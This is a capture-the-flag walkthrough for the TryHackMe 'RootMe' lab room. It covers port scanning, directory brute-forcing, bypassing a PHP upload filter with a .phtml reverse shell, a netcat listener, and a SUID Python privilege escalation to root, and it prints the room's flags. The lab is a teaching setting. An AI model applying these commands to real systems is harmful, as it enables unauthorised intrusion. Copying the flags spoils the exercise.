# TryHackMe: RootMe – Full Walkthrough

## Introduction
- **Room**: [RootMe](https://tryhackme.com/room/rootme)
- **Platform**: TryHackMe
- **Difficulty**: Easy  
- **Description**:  
  RootMe is an introductory CTF room designed to teach the basics of penetration testing, focusing on web exploitation, file upload vulnerabilities, and privilege escalation.

---

## Table of Contents
- [1. Reconnaissance](#1-reconnaissance)
- [2. Directory Bruteforce](#2-directory-bruteforce)
- [3. Exploiting File Upload & Gaining a Shell](#3-exploiting-file-upload--gaining-a-shell)
- [4. Privilege Escalation](#4-privilege-escalation)
- [5. Flags Captured](#5-flags-captured)
- [6. Tools Used](#6-tools-used)
- [7. Key Screenshots](#7-key-screenshots)
- [8. References](#8-references)

---

## 1. Reconnaissance

### Step 1: Nmap Scan
Used `nmap` to scan the target for open ports:

```bash
nmap -A <target-ip>

Findings:

Port 22: SSH

Port 80: HTTP (Apache/2.4.29)

Very first, scanned the IP using Nmap and found two ports open – 22 for SSH and 80 for HTTP.

2. Directory Bruteforce
With HTTP open, I checked the web root but found nothing juicy. Then I ran DirBuster to uncover hidden directories.

DirBuster Configuration:

Common wordlist

Extensions: .php, .html, .txt

Findings:

/uploads/ – Possibly vulnerable upload point

/panel/ – Upload form detected

3. Exploiting File Upload & Gaining a Shell
Step 1: Attempted File Upload
I tried uploading a PHP reverse shell.

Result: Received error – PHP not allowed.

Step 2: Bypassing Extension Filters
Used Burp Suite Intruder (Sniper mode) to test alternate extensions:

.php5

.phtml

.phps

Tried various extensions and found that .phtml was accepted.

Step 3: Upload and Trigger Shell
Uploaded the reverse shell as .phtml, then set up a listener using Netcat:

bash
Copy
Edit
nc -lvnp <port>
After accessing the uploaded file via browser, I received a reverse shell as www-data.

4. Privilege Escalation
Step 1: Upgrade to TTY Shell
bash
Copy
Edit
python -c 'import pty; pty.spawn("/bin/bash")'
Step 2: SUID Binary Enumeration
bash
Copy
Edit
find / -type f -perm -4000 2>/dev/null
Finding:

SUID bit set on /usr/bin/python

Step 3: Exploit SUID Python to Gain Root
Referenced GTFOBins for Python SUID exploit:

bash
Copy
Edit
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
Result: Got a root shell

Step 4: Read Root Flag
bash
Copy
Edit
cat /root/root.txt
5. Flags Captured
User Flag: THM{y0u_g0t_a_sh3ll}

Root Flag: THM{pr1v1l3g3_3sc4l4t10n}

6. Tools Used
nmap: Service enumeration

DirBuster: Directory brute-forcing

Burp Suite: Intercept and fuzz file uploads

netcat (nc): Shell listener

python: Shell upgrade & privilege escalation

GTFOBins: Privilege escalation reference

7. Key Screenshots

🔍 Nmap Scan:

🧾 Upload Panel:

💥 Burp Suite – Intruder (Extension Fuzz):

⚡ Reverse Shell Obtained:

🔒 SUID Python Discovery:

🏁 Flags Captured:

8. References
GTFOBins – Python SUID

TryHackMe Room: RootMe

🛡️ This walkthrough is for educational purposes only. Always have permission before scanning or exploiting systems.